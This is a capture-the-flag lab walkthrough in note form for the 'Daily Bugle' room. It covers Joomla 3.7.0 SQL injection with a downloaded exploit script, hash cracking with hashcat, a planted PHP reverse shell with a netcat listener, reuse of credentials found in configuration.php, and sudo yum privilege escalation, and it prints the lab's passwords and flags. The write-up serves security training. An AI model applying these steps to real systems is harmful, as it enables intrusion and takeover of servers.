# Daily Bugle

> Converted from cybersecurity DOCX notes into a structured markdown outline and study reference.

Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.

Access the web server, who robbed the bank?

On the homepage

- **Answer:** Spiderman

### What is the Joomla version?

```text
:>dirb http://10.10.87.29 /usr/share/wordlists/dirb/common.txt 2>/dev/null
```

- found the joomla administrator directory "/administraotr/

- found robots.txt

- performed OSINT to investigate joomla default structure and used this page:

- https://www.cmsjunkie.com/blog/post/understanding-the-joomla-directory-structure

- Several default files

- opened the readme: http://10.10.87.29/README.txt

- this version is 3.7, but no third digit

- simply tried 3.7.0, intended to brute force

- **Answer:** 3.7.0

- Instead of using SQLMap, why not use a python script!*

### What is Jonah's cracked password?

- Opened exploit-db and searched for joomla 3.7

- found multiple, some are good, but relevant only to specific environments, plugins, or components

- OSINT: "joomla sqli python script

- found: https://github.com/stefanlucas/Exploit-Joomla

```text
:> wget https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py
```

- the wget version did not work

- went back to the git and copied the raw source into a file, which worked

- command: python3 joomblah2.py http://10.10.87.29 > joomblah.txt

- [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']

- thin out the information in the user's file

```text
:>grep jonah users.txt > jonah.txt
```

- edit the information in jonah.txt to include only the hashed password

```text
:>hashcat -m 3200 -a 0 jonah.txt /usr/share/wordlists/rockyou.txt
```

- **Answer:** spiderman123

### What is the user flag?

```text
:>nmap -Pn -sV -A 10.10.125.68
#################################################
Host is up (0.17s latency).
Not shown: 997 closed tcp ports (conn-refused)
```

## Port State Service Version

22/tcp open ssh OpenSSH 7.4 (protocol 2.0)

| ssh-hostkey:

| 2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)

| 256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)

```text
|_ 256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
```

80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)

```text
|_http-title: Home
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
```

| http-robots.txt: 15 disallowed entries

| /joomla/administrator/ /administrator/ /bin/ /cache/

| /cli/ /components/ /includes/ /installation/ /language/

```text
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-generator: Joomla! - Open Source Content Management
```

3306/tcp open mysql MariaDB (unauthorized)

```text
#################################################
```

- tried ssh but jonah not authorized for ssh

- Reverse Shell is the next step

- The Extensions menu has "templates" and sub-items templates and styles

- Templates are more like site templets that will contain the pages.

- Moved into the protostar template and created a new file titled "myrvshll.php"

- there is a note that the attacker is editing the "myrvshll.php" file in the template protostar

- used the code from the reverse shell file in the local /usr/share/webshells/php/.

- edited the code to include the attacker IP and the attacking port (4545)

- added the code to the new file and saved.

- started my netcat on port 4545

- Opened the website to http://10.10.16.93/templates/protostar/myrvshll.php and received the reverse shell

```text
:>whoami
```

- apache

```text
:>pwd
```

- / (root)

```text
:>ls -alh /home
```

- jjameson

- no access to the jjameson user

```text
:>find / -name *.txt 2>dev/null
```

- there is a "web.config.txt" in the var/www/html/

- nothing in this file.

- Also this directory contains a "configuration.php" file, which means searching for .txt was a poor choice…

- Configuration.php contained

```text
############################################
```

public $dbtype = 'mysqli';

public $host = 'localhost';

public $user = 'root';

public $password = 'nv5uz9r3ZEDzVjNu';

public $db = 'joomla';

public $dbprefix = 'fb9j5_';

public $live_site = '';

public $secret = 'UAMBRWzHO3oFPmVC';

```text
###########################################
:>su root
```

- with password: nv5uz9r3ZEDzVjNu

- did not work

```text
:>su jjameson
```

- with password: nv5uz9r3ZEDzVjNu

- success

```text
:> cd ~
```

User Flag: 27a260fe3cba712cfdedb1c86d80442e

### What is the root flag?

```text
:>sudo -l
```

- jjameson can execute "yum" with sudo

- GTFObins indicates there is an exploit for yum

- started with option (b)

- created a file customerplugin.rpm with the code from the interactive shll option

- started local python server on port 5555

- this did not work

- Instead, started typing in each of the lines of the code into the existing jjames profile

```text
:>whoami
```

- reveals root

Root flag: eec3d53292b1821868266858d7fa6f79
